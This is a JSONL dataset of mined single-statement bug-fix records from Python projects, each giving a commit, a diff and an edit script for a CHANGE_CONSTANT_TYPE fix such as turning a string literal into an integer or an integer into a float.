{"project": "poio-api", "commit_sha": "1a852c59bce4f4ab2f324835179fb70e8a0fba6b", "parent_sha": "67b07e107ac2c13dfedfd612fba25addcd973eda", "file_path": "src/poioapi/tests/test_graf_converter.py", "project_url": "https://github.com/FieldDB/poio-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -130,4 +130,4 @@ class TestGrAFConverter:\n                 ['part_of_speech/W-POS']],\n             ['phonetic_transcription/W-IPA']]\n \n-        assert expected_tiers_hierarchy == converter.tiers_hierarchy['2']\n+        assert expected_tiers_hierarchy == converter.tiers_hierarchy[2]\n", "before": "assert expected_tiers_hierarchy == converter . tiers_hierarchy [ '2' ]", "after": "assert expected_tiers_hierarchy == converter . tiers_hierarchy [ 2 ]", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"subscript\", 3, 44, 3, 74], [\"integer:2\", \"T\"], 2], [\"Delete\", [\"string:'2'\", 3, 70, 3, 73]]]"}
{"project": "yt-1", "commit_sha": "a134c0e8aa10381bf93692a1867292e2c609b838", "parent_sha": "8b01c428c1e6530517b425666c14a58282a4e94b", "file_path": "yt/data_objects/tests/test_ellipsoid.py", "project_url": "https://github.com/Xarthisius/yt-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -6,7 +6,7 @@ from yt.testing import assert_array_less, fake_random_ds\n def setup():\n     from yt.config import ytcfg\n \n-    ytcfg[\"yt\", \"loglevel\"] = \"50\"\n+    ytcfg[\"yt\", \"loglevel\"] = 50\n     ytcfg[\"yt\", \"internals\", \"withintesting\"] = True\n \n \n", "before": "ytcfg [ \"yt\" , \"loglevel\" ] = \"50\"", "after": "ytcfg [ \"yt\" , \"loglevel\" ] = 50", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 35], [\"integer:50\", \"T\"], 2], [\"Delete\", [\"string:\\\"50\\\"\", 3, 31, 3, 35]]]"}
{"project": "yt-1", "commit_sha": "bbf50522fea81fe2e8f36ee10a05260ecb3646dd", "parent_sha": "38fc8ceb2d1a2a2a50d20b39ff1d8f9a125410dc", "file_path": "yt/geometry/coordinates/tests/test_geographic_coordinates.py", "project_url": "https://github.com/Xarthisius/yt-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ def test_internal_geographic_coordinates():\n     # means our volume will be that of a shell 1000 wide, starting at r of\n     # outer_radius - 1000.\n     ds = fake_amr_ds(geometry=\"internal_geographic\")\n-    ds.outer_radius = ds.quan(5000, \"code_length\")\n+    ds.outer_radius = ds.quan(5000., \"code_length\")\n     axes = [\"latitude\", \"longitude\", \"depth\"]\n     for i, axis in enumerate(axes):\n         dd = ds.all_data()\n", "before": "ds . outer_radius = ds . quan ( 5000 , \"code_length\" )", "after": "ds . outer_radius = ds . quan ( 5000. , \"code_length\" )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 51], [\"float:5000.\", \"T\"], 1], [\"Delete\", [\"integer:5000\", 3, 31, 3, 35]]]"}
{"project": "promotions", "commit_sha": "f1f8d438ed8c95d48a910f6e98bd9e64051c8fd1", "parent_sha": "9f85fae6054f84572bc60008917dc1c68c8bf64f", "file_path": "app/promotion.py", "project_url": "https://github.com/NYU-DevOps-Fall2017-PromotionsTeam/promotions", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,7 +13,7 @@ class Promotion:\n         self.id = id(self)\n         self.name = name or 'default'\n         self.promo_type = promo_type or 'dollars'\n-        self.value = value or 0\n+        self.value = value or 0.0\n         self.start_date = start_date\n         self.end_date = end_date\n         self.detail = detail or 'n/a'\n", "before": "self . value = value or 0", "after": "self . value = value or 0.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 22, 3, 32], [\"float:0.0\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 31, 3, 32]]]"}
{"project": "python-control", "commit_sha": "2eb56606938f899be5e9646cf114839aa3cf76a4", "parent_sha": "237d1f0db007efc8814beb39887ca0ebdf592bec", "file_path": "control/freqplot.py", "project_url": "https://github.com/python-control/python-control", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -471,7 +471,7 @@ def default_frequency_range(syslist, Hz=None, number_of_samples=None, feature_pe\n \n     # Make sure there is at least one point in the range\n     if (features.shape[0] == 0): \n-        features = np.array([1]);\n+        features = np.array([1.]);\n \n     if Hz:\n         features /= 2.*np.pi\n", "before": "features = np . array ( [ 1 ] )", "after": "features = np . array ( [ 1. ] )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"list\", 3, 29, 3, 32], [\"float:1.\", \"T\"], 1], [\"Delete\", [\"integer:1\", 3, 30, 3, 31]]]"}
{"project": "ovirtdrp", "commit_sha": "e352f46a4b90d38d5402090489c342c69de3491c", "parent_sha": "c340f3e107913669f2fce4a8ef85a4caec1404b8", "file_path": "functions_ovirt.py", "project_url": "https://github.com/dbinary/ovirtdrp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -190,7 +190,7 @@ def datacenter_status(api):\n def wait_datacenter(api):\n     terminate = 0\n     dc_up = list()\n-    while terminate != '1':\n+    while terminate != 1:\n         data_centers = api.datacenters.list()\n         count = 0\n         for data_center in data_centers:\n", "before": "while terminate != '1' : data_centers = api . datacenters . list ( ) count = 0 for data_center in data_centers : ", "after": "while terminate != 1 : data_centers = api . datacenters . list ( ) count = 0 for data_center in data_centers : ", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 11, 3, 27], [\"integer:1\", \"T\"], 2], [\"Delete\", [\"string:'1'\", 3, 24, 3, 27]]]"}
{"project": "pymonk", "commit_sha": "b19085739398ce391f16192829ee22611615895b", "parent_sha": "f4086dcd8b7e13e50077ee36e2cf0e8711635389", "file_path": "monk/core/mantis.py", "project_url": "https://github.com/xumiao/pymonk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -189,7 +189,7 @@ class Mantis(base.MONKObject):\n             logger.debug('no need to merge')\n             return False\n         else:\n-            self.panda.z.add(fdq, 1 / (m + 1 / self.rho))\n+            self.panda.z.add(fdq, 1.0 / (m + 1 / self.rho))\n             logger.debug('m = {0}'.format(m))\n             logger.debug('update z {0}'.format(self.panda.z))\n             logger.debug('relative difference of z {0}'.format(rd))\n", "before": "else : self . panda . z . add ( fdq , 1 / ( m + 1 / self . rho ) )", "after": "else : self . panda . z . add ( fdq , 1.0 / ( m + 1 / self . rho ) )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 35, 3, 57], [\"float:1.0\", \"T\"], 0], [\"Delete\", [\"integer:1\", 3, 35, 3, 36]]]"}
{"project": "poky", "commit_sha": "0a3bb8b8275a37acfacfe9cd76fa726c28c232c8", "parent_sha": "7c3549f91b5aa2953cd4d870eca9e1b7c60d0b7d", "file_path": "meta/lib/oe/package_manager.py", "project_url": "https://github.com/Xilinx/poky", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -585,7 +585,7 @@ class RpmPM(PackageManager):\n \n         output = self._invoke_dnf(([\"--skip-broken\"] if attempt_only else []) +\n                          ([\"-x\", \",\".join(exclude_pkgs)] if len(exclude_pkgs) > 0 else []) +\n-                         ([\"--setopt=install_weak_deps=False\"] if self.d.getVar('NO_RECOMMENDATIONS') == 1 else []) +\n+                         ([\"--setopt=install_weak_deps=False\"] if self.d.getVar('NO_RECOMMENDATIONS') == \"1\" else []) +\n                          ([\"--nogpgcheck\"] if self.d.getVar('RPM_SIGN_PACKAGES') != '1' else [\"--setopt=gpgcheck=True\"]) +\n                          [\"install\"] +\n                          pkgs)\n", "before": "output = self . _invoke_dnf ( ( [ \"--skip-broken\" ] if attempt_only else [ ] ) + ( [ \"-x\" , \",\" . join ( exclude_pkgs ) ] if len ( exclude_pkgs ) > 0 else [ ] ) + ( [ \"--setopt=install_weak_deps=False\" ] if self . d . getVar ( 'NO_RECOMMENDATIONS' ) == 1 else [ ] ) + ( [ \"--nogpgcheck\" ] if self . d . getVar ( 'RPM_SIGN_PACKAGES' ) != '1' else [ \"--setopt=gpgcheck=True\" ] ) + [ \"install\" ] + pkgs )", "after": "output = self . _invoke_dnf ( ( [ \"--skip-broken\" ] if attempt_only else [ ] ) + ( [ \"-x\" , \",\" . join ( exclude_pkgs ) ] if len ( exclude_pkgs ) > 0 else [ ] ) + ( [ \"--setopt=install_weak_deps=False\" ] if self . d . getVar ( 'NO_RECOMMENDATIONS' ) == \"1\" else [ ] ) + ( [ \"--nogpgcheck\" ] if self . d . getVar ( 'RPM_SIGN_PACKAGES' ) != '1' else [ \"--setopt=gpgcheck=True\" ] ) + [ \"install\" ] + pkgs )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 67, 3, 107], [\"string:\\\"1\\\"\", \"T\"], 2], [\"Delete\", [\"integer:1\", 3, 106, 3, 107]]]"}
{"project": "VideocontentValuation", "commit_sha": "72b86772a7a1a5520129b99a1c4a3ff4aeb66385", "parent_sha": "501530bf695c793e29cacfd933be424c5e2693ea", "file_path": "pafy.py", "project_url": "https://github.com/iPhlouxMaster/VideocontentValuation", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1073,7 +1073,7 @@ class Pafy(object):\n         self._author = pl_data.get(\"author\")\n         self._length = int(pl_data.get(\"length_seconds\", 0))\n         self._rating = pl_data.get(\"rating\", 0.0)\n-        self._viewcount = \"\".join(re.findall(\"\\d\", pl_data.get(\"views\", 0)))\n+        self._viewcount = \"\".join(re.findall(\"\\d\", pl_data.get(\"views\", \"0\")))\n         self._viewcount = int(self._viewcount)\n         self._thumb = pl_data.get(\"thumbnail\")\n         self._description = pl_data.get(\"description\")\n", "before": "self . _viewcount = \"\" . join ( re . findall ( \"\\d\" , pl_data . get ( \"views\" , 0 ) ) )", "after": "self . _viewcount = \"\" . join ( re . findall ( \"\\d\" , pl_data . get ( \"views\" , \"0\" ) ) )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 63, 3, 75], [\"string:\\\"0\\\"\", \"T\"], 3], [\"Delete\", [\"integer:0\", 3, 73, 3, 74]]]"}
{"project": "synapse", "commit_sha": "bcaea74352034bfad7bc6e157422a2bc3127271e", "parent_sha": "c9d1ee24ca87eb9c5a5cb250b8bc34f01a26ed98", "file_path": "synapse/handlers/federation.py", "project_url": "https://github.com/cryptoempathy/synapse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -237,7 +237,7 @@ class FederationHandler(BaseHandler):\n         try:\n             yield d\n         except defer.CancelledError:\n-            raise SynapseError(\"500\", \"Unable to join remote room\")\n+            raise SynapseError(500, \"Unable to join remote room\")\n \n         try:\n             yield self.store.store_room(\n", "before": "raise SynapseError ( \"500\" , \"Unable to join remote room\" )", "after": "raise SynapseError ( 500 , \"Unable to join remote room\" )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 31, 3, 68], [\"integer:500\", \"T\"], 1], [\"Delete\", [\"string:\\\"500\\\"\", 3, 32, 3, 37]]]"}
{"project": "pysilfont", "commit_sha": "ef5600a5b59f498e8cd4f2bec41bad5a8f650010", "parent_sha": "90e65b6cde470cca403b20d5691af5a8f8ac83e2", "file_path": "lib/silfont/scripts/psfmakefea.py", "project_url": "https://github.com/silnrsi/pysilfont", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -248,7 +248,7 @@ def doit(args) :\n     if args.debug:\n         import pdb; pdb.set_trace()\n     if \"checkfix\" not in args.params:\n-        args.paramsobj.sets[\"main\"][\"checkfix\"] = None\n+        args.paramsobj.sets[\"main\"][\"checkfix\"] = \"None\"\n     if args.infile :\n         font.readaps(args.infile, args.omitaps, args.paramsobj)\n \n", "before": "args . paramsobj . sets [ \"main\" ] [ \"checkfix\" ] = None", "after": "args . paramsobj . sets [ \"main\" ] [ \"checkfix\" ] = \"None\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 55], [\"string:\\\"None\\\"\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 51, 3, 55]]]"}
{"project": "pysilfont", "commit_sha": "8384851cba49f7aa9e410deda8915ea03effeb79", "parent_sha": "ca387991fd7a9b3a3d7a5157dfa4599adb4ebff0", "file_path": "lib/silfont/scripts/psfmakefea.py", "project_url": "https://github.com/silnrsi/pysilfont", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -248,7 +248,7 @@ def doit(args) :\n     if args.debug:\n         import pdb; pdb.set_trace()\n     if \"checkfix\" not in args.params:\n-        args.paramsobj.sets[\"main\"][\"checkfix\"] = None\n+        args.paramsobj.sets[\"main\"][\"checkfix\"] = \"None\"\n     if args.infile :\n         font.readaps(args.infile, args.omitaps, args.paramsobj)\n \n", "before": "args . paramsobj . sets [ \"main\" ] [ \"checkfix\" ] = None", "after": "args . paramsobj . sets [ \"main\" ] [ \"checkfix\" ] = \"None\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 55], [\"string:\\\"None\\\"\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 51, 3, 55]]]"}
{"project": "oq-engine", "commit_sha": "8a163013c758c4e6df663805d7e4c64ecfac814d", "parent_sha": "255a9d9e60205d6262b5a879277307b2b1354a48", "file_path": "openquake/hazard/disagg/core.py", "project_url": "https://github.com/larsbutler/oq-engine", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -242,7 +242,7 @@ class DisaggMixin(Mixin):\n         constructed like so: <base_path>/disagg-results/job-<job_id>.\n \n         For example:\n-        >>> DisaggMixin.create_result_dir('/var/lib/openquake', '2847')\n+        >>> DisaggMixin.create_result_dir('/var/lib/openquake', 2847)\n         '/var/lib/openquake/disagg-results/job-2847'\n \n         :param base_path: base result storage directory (a path to an NFS\n", "before": "example : >> > DisaggMixin . create_result_dir ( '/var/lib/openquake' , '2847' )", "after": "example : >> > DisaggMixin . create_result_dir ( '/var/lib/openquake' , 2847 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 42, 3, 72], [\"integer:2847\", \"T\"], 3], [\"Delete\", [\"string:'2847'\", 3, 65, 3, 71]]]"}
{"project": "classtime", "commit_sha": "c621bb50e50e553fc539d88de364c7992654d372", "parent_sha": "3d6aaa00bafbe5d1cde753b9b4d9c4c284af6033", "file_path": "manage.py", "project_url": "https://github.com/rosshamish/classtime", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ def delete_db():\n \n def seed_db(args):\n     create_db()\n-    term = 1490\n+    term = '1490'\n     if args.term:\n         term = args.term\n     brain.get_calendar('ualberta').select_active_term(term, force_refresh=True)\n", "before": "term = 1490", "after": "term = '1490'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 16], [\"string:'1490'\", \"T\"], 2], [\"Delete\", [\"integer:1490\", 3, 12, 3, 16]]]"}
{"project": "zstack-woodpecker", "commit_sha": "8037f1478575327a1f3dd4ae6597ef96cf884eb3", "parent_sha": "9bd6b8e1545beab3d12d9ba9f29a15345e727427", "file_path": "zstackwoodpecker/zstackwoodpecker/operations/ldap_operations.py", "project_url": "https://github.com/glody/zstack-woodpecker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ import config_operations\n import os\r\n import inspect\r\n \r\n-def add_ldap_server(name, description, url, base, username, password, encryption=None, session_uuid=None):\r\n+def add_ldap_server(name, description, url, base, username, password, encryption='None', session_uuid=None):\r\n     action = api_actions.AddLdapServerAction()\r\n     action.name = name\r\n     action.description = description\r\n", "before": "def add_ldap_server ( name , description , url , base , username , password , encryption = None , session_uuid = None ) : action = api_actions . AddLdapServerAction ( ) action . name = name action . description = description", "after": "def add_ldap_server ( name , description , url , base , username , password , encryption = 'None' , session_uuid = None ) : action = api_actions . AddLdapServerAction ( ) action . name = name action . description = description", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 71, 3, 86], [\"string:'None'\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 82, 3, 86]]]"}
{"project": "robottelo", "commit_sha": "52a9e88a53c4f119ce9b428fd8d00ae45b8777f2", "parent_sha": "4ebb26abb84f5995a44db2d4e5dd1a9e34c408bb", "file_path": "tests/foreman/api/test_repository.py", "project_url": "https://github.com/ezc/robottelo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -249,7 +249,7 @@ class RepositorySyncTestCase(APITestCase):\n             product=PRDS['rhel'],\n             repo=REPOS['rhst7']['name'],\n             reposet=REPOSET['rhst7'],\n-            releasever='None',\n+            releasever=None,\n         )\n         entities.Repository(id=repo_id).sync()\n \n", "before": "repo = REPOS [ 'rhst7' ] [ 'name' ] , reposet = REPOSET [ 'rhst7' ] , releasever = 'None' ,", "after": "repo = REPOS [ 'rhst7' ] [ 'name' ] , reposet = REPOSET [ 'rhst7' ] , releasever = None ,", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"expression_list\", 3, 24, 3, 31], [\"none:None\", \"T\"], 0], [\"Delete\", [\"string:'None'\", 3, 24, 3, 30]]]"}
{"project": "django-environ", "commit_sha": "a14d80ebfadd324155ab171a038f3f45ae93d432", "parent_sha": "e12241b932794171fe1228e8bf32f65cb12068f5", "file_path": "environ/test.py", "project_url": "https://github.com/innoteq/django-environ", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -187,7 +187,7 @@ class EnvTests(BaseTests):\n         self.assertEqual(oracle_config['HOST'], 'host')\n         self.assertEqual(oracle_config['USER'], 'user')\n         self.assertEqual(oracle_config['PASSWORD'], 'password')\n-        self.assertEqual(oracle_config['PORT'], 1521)\n+        self.assertEqual(oracle_config['PORT'], '1521')\n \n         sqlite_config = self.env.db('DATABASE_SQLITE_URL')\n         self.assertEqual(sqlite_config['ENGINE'], 'django.db.backends.sqlite3')\n", "before": "self . assertEqual ( oracle_config [ 'PORT' ] , 1521 )", "after": "self . assertEqual ( oracle_config [ 'PORT' ] , '1521' )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 54], [\"string:'1521'\", \"T\"], 3], [\"Delete\", [\"integer:1521\", 3, 49, 3, 53]]]"}
{"project": "qutebrowser", "commit_sha": "87faafd9105b2b0046369e856e0c14e3f1fb9c5e", "parent_sha": "6e494605dd888556a90e68b6be7efed4a72af96f", "file_path": "qutebrowser/config/configdata.py", "project_url": "https://github.com/lytedev/qutebrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -914,7 +914,7 @@ def data(readonly=False):\n              \"matched.\"),\n \n             ('auto-follow-timeout',\n-             SettingValue(typ.Int(), 0),\n+             SettingValue(typ.Int(), '0'),\n              \"A timeout to inhibit normal-mode key bindings after a successful\"\n              \"auto-follow.\"),\n \n", "before": "( 'auto-follow-timeout' , SettingValue ( typ . Int ( ) , 0 ) , \"A timeout to inhibit normal-mode key bindings after a successful\" \"auto-follow.\" ) ,", "after": "( 'auto-follow-timeout' , SettingValue ( typ . Int ( ) , '0' ) , \"A timeout to inhibit normal-mode key bindings after a successful\" \"auto-follow.\" ) ,", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 40], [\"string:'0'\", \"T\"], 3], [\"Delete\", [\"integer:0\", 3, 38, 3, 39]]]"}
{"project": "PlexKodiConnect", "commit_sha": "872f17851fc04fbd962135d2c7b7a4d90ab80c90", "parent_sha": "94e3da09f3d1753c974296b1f9d83e923f26295c", "file_path": "resources/lib/plexbmchelper/subscribers.py", "project_url": "https://github.com/anonymosh/PlexKodiConnect", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -155,7 +155,7 @@ class SubscriptionManager:\n         serv = getServerByHost(self.server)\n         url = serv.get('protocol', 'http') + '://' \\\n             + serv.get('server', 'localhost') + ':' \\\n-            + serv.get('port', 32400) + \"/:/timeline\"\n+            + serv.get('port', '32400') + \"/:/timeline\"\n         self.download.downloadUrl(url, type=\"GET\", parameters=params)\n         # requests.getwithparams(serv.get('server', 'localhost'), serv.get('port', 32400), \"/:/timeline\", params, getPlexHeaders(), serv.get('protocol', 'http'))\n         printDebug(\"params: %s\" % params)\n", "before": "url = serv . get ( 'protocol' , 'http' ) + '://' + serv . get ( 'server' , 'localhost' ) + ':' + serv . get ( 'port' , 32400 ) + \"/:/timeline\"", "after": "url = serv . get ( 'protocol' , 'http' ) + '://' + serv . get ( 'server' , 'localhost' ) + ':' + serv . get ( 'port' , '32400' ) + \"/:/timeline\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 23, 3, 38], [\"string:'32400'\", \"T\"], 3], [\"Delete\", [\"integer:32400\", 3, 32, 3, 37]]]"}
{"project": "mysql-statsd", "commit_sha": "4c7ec42ebb70dd578e7860dab2cc6a8e6f997078", "parent_sha": "c27957776053bc5d757b9116c908f28b9ca1fafd", "file_path": "mysql_statsd/thread_mysql.py", "project_url": "https://github.com/schoology/mysql-statsd", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,7 +41,7 @@ class ThreadMySQL(ThreadBase):\n                 }\n                 self.check_lastrun[stats_type] = (time.time()*1000)\n \n-        self.sleep_interval = int(config_dict.get('mysql').get('sleep_interval', 500))/1000\n+        self.sleep_interval = int(config_dict.get('mysql').get('sleep_interval', 500))/1000.0\n \n         #Which metrics do we allow to be sent to the backend?\n         self.metrics = config_dict.get('metrics')\n", "before": "self . sleep_interval = int ( config_dict . get ( 'mysql' ) . get ( 'sleep_interval' , 500 ) ) / 1000", "after": "self . sleep_interval = int ( config_dict . get ( 'mysql' ) . get ( 'sleep_interval' , 500 ) ) / 1000.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 31, 3, 92], [\"float:1000.0\", \"T\"], 2], [\"Delete\", [\"integer:1000\", 3, 88, 3, 92]]]"}
{"project": "python___pymunk", "commit_sha": "2b93319c5a453109efee649f72842695e4dde1f0", "parent_sha": "cb1cde869427559725d666d25f195d8ad70ab7b0", "file_path": "pymunk/libload.py", "project_url": "https://github.com/cfobel/python___pymunk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,7 +41,7 @@ def load_library(libname, print_path=True):\n     except:\r\n         pass\n     \n-    if arch == 64:\n+    if arch == \"64\":\n         arch_param = \"64\"\n     else:\n         arch_param = \"\"\n", "before": "if arch == 64 : arch_param = \"64\" else : arch_param = \"\"", "after": "if arch == \"64\" : arch_param = \"64\" else : arch_param = \"\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 18], [\"string:\\\"64\\\"\", \"T\"], 2], [\"Delete\", [\"integer:64\", 3, 16, 3, 18]]]"}
{"project": "rss_merge", "commit_sha": "85785d2a98b2fbd7f1aeb382087942dc48010835", "parent_sha": "2a400050eb1c37cf927b7f28517e15d77e7badfc", "file_path": "RssMerge.py", "project_url": "https://github.com/abrioy/rss_merge", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ def main(argv):\n \tparser = argparse.ArgumentParser(description='Merge RSS feeds.')\r\n \tparser.add_argument(\r\n \t\t'--log', '-l', action='store', required=False,\r\n-\t\tdest='logLevel', default=4,\r\n+\t\tdest='logLevel', default='4',\r\n \t\thelp='logging level (default=4): 0=off, 1=critical, 2=errors, 3=warnings, 4=info, 5=debug'\r\n \t)\r\n \tparser.add_argument(\r\n", "before": "parser . add_argument ( '--log' , '-l' , action = 'store' , required = False , dest = 'logLevel' , default = 4 , help = 'logging level (default=4): 0=off, 1=critical, 2=errors, 3=warnings, 4=info, 5=debug' )", "after": "parser . add_argument ( '--log' , '-l' , action = 'store' , required = False , dest = 'logLevel' , default = '4' , help = 'logging level (default=4): 0=off, 1=critical, 2=errors, 3=warnings, 4=info, 5=debug' )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 20, 3, 29], [\"string:'4'\", \"T\"], 2], [\"Delete\", [\"integer:4\", 3, 28, 3, 29]]]"}
{"project": "typod", "commit_sha": "ae8878a88040cff96a6e46cc1a93a960003b3c19", "parent_sha": "f00c198c79a85e7a6787a5ecb74c861f6127c079", "file_path": "typo/correctors/default.py", "project_url": "https://github.com/SmartTeleMax/typod", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -140,7 +140,7 @@ class TypoDefault(object):\n         # return the best\n         better_candidates.sort(key=lambda x: x[1], reverse=True)\n         max_weight = better_candidates[0][1]\n-        better_candidates = [(cword, cweight * 100 / max_weight) for cword, cweight\n+        better_candidates = [(cword, cweight * 100.0 / max_weight) for cword, cweight\n                              in better_candidates if not _ignore_candidate(cword)]\n         return better_candidates[:max_candidates]\n \n", "before": "better_candidates = [ ( cword , cweight * 100 / max_weight ) for cword , cweight in better_candidates if not _ignore_candidate ( cword ) ]", "after": "better_candidates = [ ( cword , cweight * 100.0 / max_weight ) for cword , cweight in better_candidates if not _ignore_candidate ( cword ) ]", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 38, 3, 51], [\"float:100.0\", \"T\"], 2], [\"Delete\", [\"integer:100\", 3, 48, 3, 51]]]"}
{"project": "pyannote-video", "commit_sha": "0a80e51ca93b7bcdbeb7717b78006bc8b2088128", "parent_sha": "6264352f0a12c2ea4e30770ebd626c9625d8be7b", "file_path": "pyannote/video/face/face.py", "project_url": "https://github.com/iamprakashom/pyannote-video", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -111,7 +111,7 @@ class Face(object):\n \n     def iterfaces(self, rgb):\n         \"\"\"Iterate over all detected faces\"\"\"\n-        for face in self._face_detector(rgb, 1.0):\n+        for face in self._face_detector(rgb, 1):\n             yield face\n \n     # landmarks detection\n", "before": "for face in self . _face_detector ( rgb , 1.0 ) : yield face", "after": "for face in self . _face_detector ( rgb , 1 ) : yield face", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 40, 3, 50], [\"integer:1\", \"T\"], 3], [\"Delete\", [\"float:1.0\", 3, 46, 3, 49]]]"}
{"project": "chirp", "commit_sha": "b67bb78cf3a697e80482530454bc0516cf498706", "parent_sha": "05d80defbf4572ee712ccb9f8ba3829b22a21a18", "file_path": "chirp/vx8.py", "project_url": "https://github.com/cl4u2/chirp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -115,7 +115,7 @@ class VX8Radio(yaesu_clone.YaesuCloneModeRadio):\n             mem.empty = True\n             return mem\n         mem.freq = chirp_common.fix_rounded_step(int(_mem.freq) * 1000)\n-        mem.offset = int(_mem.offset) * 1000.0\n+        mem.offset = int(_mem.offset) * 1000\n         mem.rtone = mem.ctone = chirp_common.TONES[_mem.tone]\n         mem.tmode = TMODES[_mem.tone_mode]\n         mem.duplex = DUPLEX[_mem.duplex]\n", "before": "mem . offset = int ( _mem . offset ) * 1000.0", "after": "mem . offset = int ( _mem . offset ) * 1000", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 22, 3, 47], [\"integer:1000\", \"T\"], 2], [\"Delete\", [\"float:1000.0\", 3, 41, 3, 47]]]"}
{"project": "astropy", "commit_sha": "e1a38f38ff78430fa3ed9436c69de13cfcd58995", "parent_sha": "9cdf2076fff1c9c00eeda7cc72fc9ac853f12334", "file_path": "astropy/stats/tests/test_funcs.py", "project_url": "https://github.com/mhvk/astropy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -690,7 +690,7 @@ def test_poisson_conf_kbn_value_errors():\n def test_poisson_limit_nodependencies():\n     with pytest.raises(ImportError):\n         with pytest.warns(AstropyDeprecationWarning):\n-            funcs.poisson_conf_interval(20., interval='kraft-burrows-nousek',\n+            funcs.poisson_conf_interval(20, interval='kraft-burrows-nousek',\n                                         background=10., conflevel=.95)\n \n \n", "before": "funcs . poisson_conf_interval ( 20. , interval = 'kraft-burrows-nousek' , background = 10. , conflevel = .95 )", "after": "funcs . poisson_conf_interval ( 20 , interval = 'kraft-burrows-nousek' , background = 10. , conflevel = .95 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 40, 4, 71], [\"integer:20\", \"T\"], 1], [\"Delete\", [\"float:20.\", 3, 41, 3, 44]]]"}
